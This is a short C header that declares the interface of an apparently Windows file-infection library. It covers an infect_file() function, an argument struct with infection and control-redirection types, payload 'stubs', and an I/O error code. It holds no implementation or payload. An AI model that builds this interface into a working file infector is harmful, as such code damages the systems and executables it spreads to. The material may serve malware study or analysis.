#ifndef _FINFECT_H
#define _FINFECT_H

#include <tchar.h>
#include "infect.h"

#define INFLIB_ERR_FILE_IO		-0x40

struct infect_file_arg {
	const enum inf_type_t *inf_p;
	const enum cntrl_redr_type_t *cr_p;
	struct inf_stub *inf_stubs;
	uint32_t nstubs;
};

int infect_file(const TCHAR *file_path, const struct infect_file_arg *arg,
		infection_status_cb status_cb);

#endif